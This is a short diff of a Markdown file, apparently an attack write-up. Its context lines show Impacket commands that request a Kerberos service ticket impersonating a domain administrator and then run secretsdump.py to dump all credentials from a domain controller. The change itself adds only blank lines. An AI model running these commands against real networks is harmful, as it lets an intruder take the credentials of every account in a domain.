@@ -21,3 +21,5 @@ TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSW
 export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
 secretsdump.py -k -no-pass second-dc-server.local -just-dc
 ```
+
+
